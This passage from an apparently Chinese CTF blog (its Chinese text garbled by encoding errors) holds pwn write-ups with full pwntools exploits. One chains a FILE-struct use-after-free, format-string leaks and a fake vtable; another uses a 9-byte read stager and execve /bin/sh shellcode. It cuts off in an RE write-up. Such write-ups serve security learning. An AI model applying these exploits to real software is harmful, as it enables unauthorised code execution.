                >  </p>
<p>ä¸»è¦æ¼æ´å‡ºåœ¨ç¬¬ä¸‰ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œé‚£å°±æ˜¯ fopen å’Œ fcloseï¼Œå½“è°ƒç”¨äº† fopen ä¹‹åï¼Œå†…æ ¸ä¼šæ‰“å¼€ä¸€ä¸ªç£ç›˜ä¸Šçš„æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨æ–‡ä»¶æŒ‡é’ˆ(å°±æ˜¯ FILE* ç±»å‹)æ¥æ ‡è®°æ‰“å¼€çš„æ–‡ä»¶ï¼Œå¹¶ä¸”å°†è¿™ä¸ªç»“æ„ä½“å­˜å‚¨åœ¨å †ä¸Šï¼Œå½“è°ƒç”¨ fclose æ—¶ï¼Œå†…æ ¸çš„å…³é”®æ“ä½œæ˜¯ free ä¹‹å‰åˆ›å»ºåœ¨å †ä¸Šçš„å †å—ï¼Œæ¸…é™¤å·²ç»æ‰“å¼€çš„æ–‡ä»¶æŒ‡é’ˆï¼Œä½†æ˜¯ï¼Œæœ¬é¢˜å°† fopen æ‰€åˆ›å»ºçš„å †å—åœ°å€ç»™äº†ä¸€ä¸ªå…¨å±€å˜é‡ streamï¼Œè€Œåœ¨ fclose ä¹‹åæ²¡æœ‰æ¸…é™¤è¿™ä¸ªæŒ‡é’ˆï¼Œé€ æˆ UAFï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•é‡Šæ”¾ stream ä¹‹åä¿®æ”¹å †å—çš„å†…å®¹æ¥åŠ«æŒ vtableã€‚<br>æœ¬é¢˜æ‰€æœ‰ä¿æŠ¤éƒ½å¼€å¯äº†ï¼Œé¦–å…ˆè¦åšçš„æ˜¯æ³„éœ²åœ°å€ï¼Œä»”ç»†è§‚å¯Ÿï¼Œåœ¨ compare å‡½æ•°ä¸­æœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯ç”±äºä½¿ç”¨äº† printf_chkï¼Œæ‰€ä»¥å¹¶ä¸èƒ½æ‹¿æ¥ä¿®æ”¹åœ°å€ï¼Œåªèƒ½æ³„éœ²ä¸€äº›åœ°å€ã€‚<br>ä¸€ä¸ªçŸ¥è¯†ç‚¹æ˜¯ï¼Œå½“ scanf è¾“å…¥è¾ƒå¤šï¼Œä¼šåœ¨å †ä¸Šç”³è¯·ç©ºé—´å¹¶å­˜å‚¨è¾“å…¥(å½“ç„¶æ ˆä¸Šä¹Ÿæœ‰)è¿™å°±å¯¼è‡´äº†æ³„éœ²å‡ºçš„åœ°å€ä½ç½®æ¯”è¾ƒå¥‡æ€ªï¼Œéœ€è¦å¤šæ¬¡æµ‹è¯•æ‰èƒ½æ‰¾åˆ°åˆé€‚çš„åœ°å€ã€‚<br>æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸‰ä¸ªå¿…è¦çš„åœ°å€ï¼ŒlibcåŸºåœ°å€ã€ç¨‹åºçš„åœ°å€ä»¥åŠå †çš„åœ°å€ã€‚  </p>
<p>æ³„éœ²å‡ºåœ°å€ä¹‹åï¼Œå¼€å§‹æ„å»ºæ¼æ´åˆ©ç”¨ç¯å¢ƒï¼Œå°† stream closeï¼Œæ¥ç€è°ƒç”¨ compareï¼Œå½“ scanf çš„æ—¶å€™ï¼Œå°±ä¼šå°†åˆšåˆš free çš„ FILE ç»“æ„ä½“ç»™åˆ†é…å›æ¥ï¼Œå¹¶ä¸”å¯ä»¥å†™å…¥ä»»æ„çš„å€¼ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¼€å§‹ä¼ªé€  FILE ç»“æ„ä½“ï¼Œå¹¶ä¸”å°† vtable è¿ç§»åˆ°å †ä¸Šå¯æ§å†…å­˜ä¸­ï¼Œä¼ªé€ å¥½ vtable å‡½æ•°æŒ‡é’ˆï¼Œå½“æ‰§è¡Œ fread æ—¶ä¼šå‡ºé”™ï¼Œç¨‹åºè·‘åˆ° _IO_flush_all_lockpï¼Œç„¶åè°ƒç”¨ä¼ªé€ çš„å‡½æ•°(one_gadget)ï¼Œå³å¯æ‹¿åˆ° shellã€‚</p>
<p>å…³äº IO_FILE çš„ä¸€äº›åˆ†æåœ¨å‰é¢çš„æ–‡ç« ä¸­è¯´è¿‡äº†ï¼Œæ‰€ä»¥ç›´æ¥ç»™å‡ºè„šæœ¬</p>
<p>PS: å€Ÿç”¨äº† Lilac æˆ˜é˜Ÿå¸ˆå‚…ä»¬çš„è„šæœ¬ï¼Œå¸ˆå‚…ä»¬æŠŠ IO_FILE çš„ä¸€äº›ç»“æ„ä½“å°è£…åœ¨äº†ä¸€ä¸ªç±»é‡Œé¢ï¼Œç”¨èµ·æ¥å¾ˆæ–¹ä¾¿ã€‚</p>
<p>IO_FILE ç±»</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line">_IO_USE_OLD_IO_FILE = False</span><br><span class="line">_BITS = 64</span><br><span class="line"> </span><br><span class="line">def _u64(data):</span><br><span class="line">    return struct.unpack(&quot;&lt;Q&quot;,data)[0]</span><br><span class="line"> </span><br><span class="line">def _u32(data):</span><br><span class="line">    return struct.unpack(&quot;&lt;I&quot;,data)[0]</span><br><span class="line"> </span><br><span class="line">def _u16(data):</span><br><span class="line">    return struct.unpack(&quot;&lt;H&quot;,data)[0]</span><br><span class="line"> </span><br><span class="line">def _u8(data):</span><br><span class="line">    return ord(data)</span><br><span class="line"> </span><br><span class="line">def _usz(data):</span><br><span class="line">    if _BITS == 32:</span><br><span class="line">        return _u32(data)</span><br><span class="line">    elif _BITS == 64:</span><br><span class="line">        return _u64(data)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;[-] Invalid _BITS&quot;)</span><br><span class="line">        exit()</span><br><span class="line"> </span><br><span class="line">def _ua(data):</span><br><span class="line">    if _BITS == 32:</span><br><span class="line">        return _u32(data)</span><br><span class="line">    elif _BITS == 64:</span><br><span class="line">        return _u64(data)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;[-] Invalid _BITS&quot;)</span><br><span class="line">        exit()</span><br><span class="line"> </span><br><span class="line">def _p64(data):</span><br><span class="line">    return struct.pack(&quot;&lt;Q&quot;,data)</span><br><span class="line"> </span><br><span class="line">def _p32(data):</span><br><span class="line">    return struct.pack(&quot;&lt;I&quot;,data)</span><br><span class="line"> </span><br><span class="line">def _p16(data):</span><br><span class="line">    return struct.pack(&quot;&lt;H&quot;,data)</span><br><span class="line"> </span><br><span class="line">def _p8(data):</span><br><span class="line">    return chr(data)</span><br><span class="line"> </span><br><span class="line">def _psz(data):</span><br><span class="line">    if _BITS == 32:</span><br><span class="line">        return _p32(data)</span><br><span class="line">    elif _BITS == 64:</span><br><span class="line">        return _p64(data)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;[-] Invalid _BITS&quot;)</span><br><span class="line">        exit()</span><br><span class="line"> </span><br><span class="line">def _pa(data):</span><br><span class="line">    if _BITS == 32:</span><br><span class="line">        return struct.pack(&quot;&lt;I&quot;, data)</span><br><span class="line">    elif _BITS == 64:</span><br><span class="line">        return struct.pack(&quot;&lt;Q&quot;, data)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;[-] Invalid _BITS&quot;)</span><br><span class="line">        exit()</span><br><span class="line"> </span><br><span class="line">class _IO_FILE_plus:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self._flags = 0xfbad2887         # High-order word is _IO_MAGIC; rest is flags.</span><br><span class="line">        self._IO_read_ptr = 0   # Current read pointer</span><br><span class="line">        self._IO_read_end = 0   # End of get area</span><br><span class="line">        self._IO_read_base = 0  # Start of putback+get area</span><br><span class="line">        self._IO_write_base = 0 # Start of put area</span><br><span class="line">        self._IO_write_ptr = 0  # Current put pointer</span><br><span class="line">        self._IO_write_end = 0  # End of put area</span><br><span class="line">        self._IO_buf_base = 0   # Start of reserve area</span><br><span class="line">        self._IO_buf_end = 0    # End of reserve area</span><br><span class="line"> </span><br><span class="line">        # The following fields are used to support backing up and undo.</span><br><span class="line">        self._IO_save_base = 0      # Pointer to start of non-current get area</span><br><span class="line">        self._IO_backup_base = 0    # Pointer to first valid character of backup area</span><br><span class="line">        self._IO_save_end = 0       # Pointer to end of non-current get area</span><br><span class="line"> </span><br><span class="line">        self._markers = 0</span><br><span class="line">        self._chain = 0</span><br><span class="line"> </span><br><span class="line">        self._fileno = 0</span><br><span class="line">        self._flags2 = 0</span><br><span class="line">        self._old_offset = 0    # This used to be _offset but it&#x27;s too small</span><br><span class="line"> </span><br><span class="line">        # 1+column number of pbase(); 0 is unknown</span><br><span class="line">        self._cur_column = 0</span><br><span class="line">        self._vtable_offset = 0</span><br><span class="line">        self._shortbuf = 0</span><br><span class="line"> </span><br><span class="line">        self._lock = 0</span><br><span class="line"> </span><br><span class="line">        if not _IO_USE_OLD_IO_FILE:</span><br><span class="line">            self._offset = 0</span><br><span class="line">            self._codecvt = 0</span><br><span class="line">            self._wide_data = 0</span><br><span class="line">            self._freeres_list = 0</span><br><span class="line">            self._freeres_buf = 0</span><br><span class="line">            self.__pad5 = 0</span><br><span class="line">            self._mode = 0</span><br><span class="line">            self._unused2 = [0 for i in range(15 * 4 - 5 * _BITS / 8)]</span><br><span class="line">        self.vtable = 0</span><br><span class="line"> </span><br><span class="line">    def tostr(self):</span><br><span class="line">        buf = _p64(self._flags &amp; 0xffffffff) + \</span><br><span class="line">            _pa(self._IO_read_ptr) + \</span><br><span class="line">            _pa(self._IO_read_end) + \</span><br><span class="line">            _pa(self._IO_read_base) + \</span><br><span class="line">            _pa(self._IO_write_base) + \</span><br><span class="line">            _pa(self._IO_write_ptr) + \</span><br><span class="line">            _pa(self._IO_write_end) + \</span><br><span class="line">            _pa(self._IO_buf_base) + \</span><br><span class="line">            _pa(self._IO_buf_end) + \</span><br><span class="line">            _pa(self._IO_save_base) + \</span><br><span class="line">            _pa(self._IO_backup_base) + \</span><br><span class="line">            _pa(self._IO_save_end) + \</span><br><span class="line">            _pa(self._markers) + \</span><br><span class="line">            _pa(self._chain) + \</span><br><span class="line">            _p32(self._fileno) + \</span><br><span class="line">            _p32(self._flags2) + \</span><br><span class="line">            _p64(self._old_offset) + \</span><br><span class="line">            _p16(self._cur_column) + \</span><br><span class="line">            _p8(self._vtable_offset) + \</span><br><span class="line">            _p8(self._shortbuf)</span><br><span class="line">        if _BITS == 64:</span><br><span class="line">            buf += _p32(0)</span><br><span class="line">        buf += _pa(self._lock)</span><br><span class="line">        if not _IO_USE_OLD_IO_FILE:</span><br><span class="line">            buf += \</span><br><span class="line">            _p64(self._offset) + \</span><br><span class="line">            _pa(self._codecvt) + \</span><br><span class="line">            _pa(self._wide_data) + \</span><br><span class="line">            _pa(self._freeres_list) + \</span><br><span class="line">            _pa(self._freeres_buf) + \</span><br><span class="line">            _psz(self.__pad5) + \</span><br><span class="line">            _p32(self._mode) + \</span><br><span class="line">            &#x27;&#x27;.join(map(lambda x:_p8(x), self._unused2)) +\</span><br><span class="line">            _pa(self.vtable)</span><br><span class="line">        return buf</span><br><span class="line"> </span><br><span class="line">    def __str__(self):</span><br><span class="line">        return self.tostr()</span><br></pre></td></tr></table></figure></div>

<p>EXP</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import IO_FILE</span><br><span class="line"></span><br><span class="line"># context(log_level=&quot;DEBUG&quot;)</span><br><span class="line">p = process(&quot;./random&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">#  =======  Build uaf pointer =======</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line">sleep(0.1)</span><br><span class="line"># =======  Leak address =======</span><br><span class="line">payload1 = &quot;%p&quot;*393 + &quot;abcde&quot; + &quot;%p&quot; *12</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(&quot;abcde&quot;)</span><br><span class="line">elf_base = int(p.recv(14),16) - 0x2020b0</span><br><span class="line">log.success(&quot;ELF BASE : 0X%x&quot; % elf_base)</span><br><span class="line">payload2 = &quot;%p&quot; * (393 + 12) + &quot;qwert&quot; + &quot;%p&quot;</span><br><span class="line">sleep(0.1)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(&quot;qwert&quot;)</span><br><span class="line">libc_addr = int(p.recv(14),16) - libc.symbols[&quot;__libc_start_main&quot;] - 240</span><br><span class="line">log.success(&quot;libc_addr : 0x%x&quot; % libc_addr)</span><br><span class="line">one_gadget = libc_addr + 0xf02a4</span><br><span class="line">sleep(0.1)</span><br><span class="line">payload3 =  &quot;%p&quot; * 9 + &quot;%s%s%s&quot; + p64(elf_base + 0x2020a0)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">sleep(0.1)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">sleep(0.1)</span><br><span class="line">p.recvuntil(&quot;next\n&quot;)</span><br><span class="line">p.recv(100)</span><br><span class="line">heap_addr = u64(p.recv(6).ljust(8, &quot;\x00&quot;))</span><br><span class="line">log.success(&quot;heap_addr : 0x%x&quot; % heap_addr)</span><br><span class="line">sleep(0.1)</span><br><span class="line"># ======= Fake vtable attack =======</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">fake_file = IO_FILE._IO_FILE_plus()</span><br><span class="line">fake_file._IO_write_ptr = 1</span><br><span class="line">fake_file.vtable = heap_addr + 0xe0</span><br><span class="line">fake_file._lock = heap_addr + 0x2000</span><br><span class="line">payload4 = fake_file.tostr() + p64(0) + p64(one_gadget) * 0x20</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">sleep(0.1)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendline(&quot;0&quot;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>


<h3 id="4-treasure"><a href="#4-treasure" class="headerlink" title="4. treasure"></a>4. treasure</h3><p>æœ¬é¢˜æœ‰ç‚¹æ„æ€ï¼Œç¬¬ä¸€ä¸ªå‡½æ•°çš„ä»£ç ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">void *settreasure()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax</span><br><span class="line">  int v1; // ST0C_4</span><br><span class="line"></span><br><span class="line">  sea = mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);</span><br><span class="line">  code = mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);</span><br><span class="line">  v0 = time(0LL);</span><br><span class="line">  srand(v0);</span><br><span class="line">  v1 = rand() % 900;</span><br><span class="line">  memcpy((sea + v1), &quot;TREASURE&quot;, 8uLL);</span><br><span class="line">  memcpy((sea + v1), &amp;shellcode, 38uLL);</span><br><span class="line">  return memset(&amp;shellcode, 0, 0x25uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è°ƒç”¨ mmap åœ¨ä¸€ä¸ªéšæœºçš„åœ°å€åˆ†é…äº†ç©ºé—´ï¼Œç„¶åæŠŠä¸€æ®µ shellcode æ‹·è´åˆ°æ–°åˆ†é…çš„ç©ºé—´ä¸­ï¼Œéšåæ¸…é™¤åŸæ¥çš„ shellcodeã€‚<br>ç¬¬äºŒä¸ªå‡½æ•°ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 treasure()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 (__fastcall *v0)(); // rsi</span><br><span class="line">  void *v1; // rsi</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  puts(&quot;Do you want my treasure? Find them yourself! It&#x27;s shellcode!\n&quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  v0 = 10;</span><br><span class="line">  make_code_executable(code, 10);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;, v0);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    v1 = code;</span><br><span class="line">    read(0, code, 1uLL);</span><br><span class="line">    result = *code;</span><br><span class="line">    if ( result == &#x27;n&#x27; )</span><br><span class="line">      break;</span><br><span class="line">    getchar();</span><br><span class="line">    printf(&quot;start!!!!&quot;, v1);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    v0 = 9;</span><br><span class="line">    getsn(code + 1, 9u);</span><br><span class="line">    if ( !*(code + 10) )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = nullsub_1;</span><br><span class="line">      memcpy(code + 10, nullsub_1, 1uLL);</span><br><span class="line">    &#125;</span><br><span class="line">    ret = ((code + 1))(ret, v0);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ˜¯ç¨‹åºçš„ä¸»è¦é€»è¾‘ï¼Œç®€å•çš„è¯´å°±æ˜¯ä¸€æ¬¡å¯ä»¥æ‰§è¡Œä¸å¤§äº 9 ä¸ªå­—èŠ‚çš„ä»»æ„ä»£ç ï¼Œè¦æ±‚åœ¨è¿™ç§æƒ…å†µä¸‹æ‹¿åˆ° shellã€‚<br>ä¿æŠ¤åªå¼€äº† NXã€‚  </p>
<p>è¿™é“é¢˜åœ¨æ¯”èµ›çš„æ—¶å€™æƒ³äº†å¾ˆå¤šåšæ³•ï¼Œä½†æ˜¯éƒ½å¤±è´¥äº†ï¼Œç°åœ¨å›æƒ³åŸå› æ˜¯æ‰è¿›äº†å‡ºé¢˜äººçš„å‘é‡Œé¢ï¼Œæ€»æ˜¯å…ˆè¦æ‰¾åŠæ³•å‘½ä¸­å‡ºé¢˜äººçš„ shellcodeï¼Œä½†å®é™…ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ 9 ä¸ªå­—èŠ‚æ¥åšä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œread è‡ªå·±çš„ shellcodeã€‚ </p>
<p>é¦–å…ˆï¼Œè¦é€šè¿‡åŠ¨æ€è°ƒè¯•æ¥çœ‹çœ‹åœ¨è·³è½¬åˆ° 9 å­—èŠ‚ shellcode æ—¶ï¼Œç¯å¢ƒæ˜¯æ€æ ·çš„<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-7.png"
                      alt="image"
                > </p>
<p>å¯„å­˜å™¨æ–¹é¢ï¼Œæœ‰ç”¨çš„åœ°å€åœ¨ RDX ä¸­ï¼Œé‡Œé¢å­˜å‚¨ç€ shellcode çš„åœ°å€ï¼Œä¸”ä½äºå¯è¯»å¯å†™å¯æ‰§è¡Œæ®µã€‚<br>æ ˆä¸Šæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„åœ°å€ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å°±åˆ©ç”¨ RDX æ„é€  read ç³»ç»Ÿè°ƒç”¨ã€‚<br>é¦–å…ˆåœ¨ç½‘ä¸Šæ‰¾ä¸€ä¸‹ 64 ä½ linux çš„ç³»ç»Ÿè°ƒç”¨è¡¨ï¼Œå‘ç° 0 å· syscall å°±æ˜¯ read<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-8.png"
                      alt="image"
                > </p>
<p>æ ¹æ®å‚æ•°è¡¨ï¼Œå¯ä»¥å†™å‡ºä»¥ä¸‹æ±‡ç¼–ï¼Œæ¥æ»¡è¶³ syscall çš„è¦æ±‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">push rdx</span><br><span class="line">pop rsi</span><br><span class="line">push 100</span><br><span class="line">pop rdx</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></div>

<p>è¿™å‡ å¥æ±‡ç¼–è½¬æ¢æˆæœºå™¨ç ä¹‹åçš„é•¿åº¦æ˜¯ 8 ä¸ªå­—èŠ‚ï¼Œæ»¡è¶³è¦æ±‚ï¼Œå®ç°çš„åŠŸèƒ½æ˜¯å‘ RWX æ®µå†™å…¥è‡ªå·±çš„ shellcodeã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-9.png"
                      alt="image"
                ></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ çœŸæ­£çš„ shellcode äº†ï¼Œå¦‚æœç›´æ¥æŠŠ shellcode å†™ä¸Šå»çš„è¯ï¼Œä¼šå‘ç°ç¨‹åºç›´æ¥å´©æºƒé€€å‡ºï¼ŒåŸå› æ˜¯ä¿®æ”¹äº†æ­£åœ¨æ‰§è¡Œä¸­çš„ä»£ç ï¼Œrip æŒ‡å‘äº†æœºå™¨ç ä¸­çš„ä¸€ä¸ªéæ³•ä½ç½®ï¼Œä»è€ŒæŠ›å‡ºå¼‚å¸¸ã€‚<br>æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦ç»™ shellcode æ·»åŠ ä¸€ç‚¹å‰ç¼€ï¼ŒåŠ ä¸Šä¸€äº› \x90ï¼Œè¿™æ ·ï¼Œrip å°±ä¼šå‘½ä¸­ä¸€å † nop ï¼Œä»è€Œæ­£ç¡®çš„æ‰§è¡Œåˆ° shellcode(åˆå«åšé›ªæ©‡æ”»å‡»)ã€‚</p>
<p>è„šæœ¬</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">p = process(&quot;./treasure&quot;)</span><br><span class="line">p.recvuntil(&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;)</span><br><span class="line">p.sendline(&quot;y&quot;)</span><br><span class="line">p.recvuntil(&quot;start!!!!&quot;)</span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">                 push rdx</span><br><span class="line">                 pop rsi</span><br><span class="line">                 push 100</span><br><span class="line">                 pop rdx</span><br><span class="line">                 syscall</span><br><span class="line">                 ret</span><br><span class="line">                 &#x27;&#x27;&#x27;)</span><br><span class="line">print(len(shellcode))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">shellcode_x64 = &#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05&#x27;</span><br><span class="line">sleep(0.1)</span><br><span class="line">print(len(shellcode_x64))</span><br><span class="line">p.sendline(shellcode_x64)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>æ¹–æ¹˜æ¯ 2018 çº¿ä¸Šèµ›éƒ¨åˆ†é¢˜ç›®å¤ç°</title>
    <url>/2018/11/20/hxb-2018-online/</url>
    <content><![CDATA[<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="1-Replace"><a href="#1-Replace" class="headerlink" title="1. Replace"></a>1. Replace</h3><p>ç¨‹åºç»™åŠ äº† UPX çš„å£³ï¼Œç›´æ¥åœ¨ linux ä¸‹é¢è„±æ‰ï¼Œæ³¨æ„è„±å®Œå£³çš„ç¨‹åºå°±ä¸èƒ½æ­£å¸¸è¿è¡Œäº†ã€‚<br>è„±äº†å£³ç›´æ¥ä¸¢åˆ° IDA é‡Œé¢å»çœ‹ï¼Œé€»è¾‘å¾ˆæ¸…æ™°ï¼Œä¸»å‡½æ•°åªæœ‰ä¸€ç‚¹ç‚¹ä»£ç </p>
<span id="more"></span>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="type">char</span> Buf; <span class="comment">// [esp+4h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">char</span> Dst; <span class="comment">// [esp+5h] [ebp-2Bh]</span></span><br><span class="line"></span><br><span class="line">  Buf = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x27</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome The System\nPlease Input Key:&quot;</span>);</span><br><span class="line">  gets_s(&amp;Buf, <span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(&amp;Buf);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 - <span class="number">35</span>) &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_401090(&amp;Buf, v3) == <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Well Done!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your Wrong!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>å…³é”®å‡½æ•°æ˜¯ sub_401090ï¼Œå¦‚æœå¯¹åŠ å¯†ç®—æ³•ç†Ÿæ‚‰çš„è¯å¾ˆå®¹æ˜“å¯ä»¥çœ‹å‡ºæ¥è¿™æ˜¯ AES åŠ å¯†ï¼Œç»™å‡ºäº†å¯†é’¥å’Œå¯†æ–‡ï¼Œé‚£ç›´æ¥å†™è§£å¯†è„šæœ¬å°±è¡Œã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">target = [<span class="number">99</span>, <span class="number">124</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">103</span>, <span class="number">43</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">171</span>, <span class="number">118</span>, <span class="number">202</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">71</span>, <span class="number">240</span>, <span class="number">173</span>, <span class="number">212</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">156</span>, <span class="number">164</span>, <span class="number">114</span>, <span class="number">192</span>, <span class="number">183</span>, <span class="number">253</span>, <span class="number">147</span>, <span class="number">38</span>, <span class="number">54</span>, <span class="number">63</span>, <span class="number">247</span>, <span class="number">204</span>, <span class="number">52</span>, <span class="number">165</span>, <span class="number">229</span>, <span class="number">241</span>, <span class="number">113</span>, <span class="number">216</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">4</span>, <span class="number">199</span>, <span class="number">35</span>, <span class="number">195</span>, <span class="number">24</span>, <span class="number">150</span>, <span class="number">5</span>, <span class="number">154</span>, <span class="number">7</span>, <span class="number">18</span>, <span class="number">128</span>, <span class="number">226</span>, <span class="number">235</span>, <span class="number">39</span>, <span class="number">178</span>, <span class="number">117</span>, <span class="number">9</span>, <span class="number">131</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">110</span>, <span class="number">90</span>, <span class="number">160</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">214</span>, <span class="number">179</span>, <span class="number">41</span>, <span class="number">227</span>, <span class="number">47</span>, <span class="number">132</span>, <span class="number">83</span>, <span class="number">209</span>, <span class="number">0</span>, <span class="number">237</span>, <span class="number">32</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">91</span>, <span class="number">106</span>, <span class="number">203</span>, <span class="number">190</span>, <span class="number">57</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">88</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">170</span>, <span class="number">251</span>, <span class="number">67</span>, <span class="number">77</span>, <span class="number">51</span>, <span class="number">133</span>, <span class="number">69</span>, <span class="number">249</span>, <span class="number">2</span>, <span class="number">127</span>, <span class="number">80</span>, <span class="number">60</span>, <span class="number">159</span>, <span class="number">168</span>, <span class="number">81</span>, <span class="number">163</span>, <span class="number">64</span>, <span class="number">143</span>, <span class="number">146</span>, <span class="number">157</span>, <span class="number">56</span>, <span class="number">245</span>, <span class="number">188</span>, <span class="number">182</span>, <span class="number">218</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">255</span>, <span class="number">243</span>, <span class="number">210</span>, <span class="number">205</span>, <span class="number">12</span>, <span class="number">19</span>, <span class="number">236</span>, <span class="number">95</span>, <span class="number">151</span>, <span class="number">68</span>, <span 